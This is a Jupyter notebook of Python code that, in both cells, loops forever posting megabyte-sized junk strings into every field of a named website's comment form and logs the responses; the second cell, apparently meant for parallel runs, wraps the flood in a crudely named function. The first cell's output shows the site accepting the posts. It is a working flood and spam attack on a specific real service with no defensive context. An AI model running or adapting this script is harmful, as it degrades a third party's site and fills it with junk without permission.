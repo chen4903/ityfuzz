{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"code\":1,\"msg\":\"操作成功\",\"data\":\"\"}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "uniques = set()\n",
    "while True:\n",
    "    params = {\n",
    "        'id': '1',\n",
    "    }\n",
    "    data = {\n",
    "        'uid': 'A' * (1024 * 1024),\n",
    "        'group_name': 'A' * (1024 * 1024),\n",
    "        'name': 'A' * (1024 * 1024),\n",
    "        'remark': 'A' * (1024 * 1024),\n",
    "        'contents': 'A' * (1024 * 1024),\n",
    "    }\n",
    "    response = requests.post('http://www.okmou.com/comments/add', params=params, data=data)\n",
    "    if response.text not in uniques:\n",
    "        with open('result.txt', 'a+') as f:\n",
    "            f.write(response.text + '\\n')\n",
    "        uniques.add(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import multiprocessing\n",
    "import requests\n",
    "\n",
    "def fuck():\n",
    "    uniques = set()\n",
    "    while True:\n",
    "        params = {\n",
    "            'id': '1',\n",
    "        }\n",
    "        data = {\n",
    "            'uid': 'A' * (1024 * 1024),\n",
    "            'group_name': 'A' * (1024 * 1024),\n",
    "            'name': 'A' * (1024 * 1024),\n",
    "            'remark': 'A' * (1024 * 1024),\n",
    "            'contents': 'A' * (1024 * 1024),\n",
    "        }\n",
    "        response = requests.post('http://www.okmou.com/comments/add', params=params, data=data)\n",
    "        if response.text not in uniques:\n",
    "            with open('result.txt', 'a+') as f:\n",
    "                f.write(response.text + '\\n')\n",
    "            uniques.add(response.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
